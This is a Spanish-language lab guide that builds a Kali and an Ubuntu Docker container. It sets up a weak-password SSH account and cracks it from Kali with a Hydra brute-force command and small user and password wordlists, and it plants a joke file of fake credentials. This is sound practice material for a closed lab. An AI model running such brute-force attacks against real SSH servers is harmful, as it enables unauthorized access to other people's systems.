## Escenario1

### Docker-compose

```docker-compose
version: '3'

services:
  kali-linux:
    image: kalilinux/kali-rolling
    container_name: kali-container
    tty: true
    stdin_open: true
    command: /bin/bash
    networks:
      - mynetwork

  ubuntu:
    image: ubuntu
    container_name: ubuntu-container
    tty: true
    stdin_open: true
    command: /bin/bash
    networks:
      - mynetwork
    depends_on:
      - kali-linux

networks:
  mynetwork:
    driver: bridge
```

```bash
docker-compose up -d
```





### Kali-container

```bash
bash
```

```bash
docker exec -ti kali-container /bin/sh
```

```bash
apt update
```

```bash
apt install -y nano
```

```bash
apt install -y openssh-server openssh-client
service ssh start
```

```bash
apt install -y hydra
```

```bash
nano users.txt
nano passwords.txt
```

```bash
#nano users.txt
admin
administrador
user
usuario
root
mario
pablo
cristian
```

```bash
#nano passwords.txt
12345678
admin
mypass
abc123.
password
```



**Una vez hecho el apartado "Ubuntu-container"**

```bash
hydra -L ./users.txt -P passwords.txt ea707459946d -t 4 ssh
```

***ea707459946d* corresponde con el hostname de *ubuntu-container* en este caso.**



```bash
ssh mario@ea707459946d
#abc123.
```



### Ubuntu-container

```bash
bash
```

```bash
docker exec -ti ubuntu-container /bin/sh 
```

```bash
apt update
```

```bash
apt install -y nano
```

```bash
apt install -y openssh-server openssh-client
service ssh start
```

```bash
useradd mario -s /bin/bash -m   
passwd mario 
#abc123.
```

```bash
mkdir /home/mario/secreto
nano /home/mario/secreto/contraseñas.txt 
# te la creiste ;)
ip 192.168.0.10 
	#users	->	#passwords
	eric_cartman -> southpark1
	stan_marsh -> southpark2
	kenny_mccormick -> southpark3
	kyle_broflovsky -> southpark4
	
```



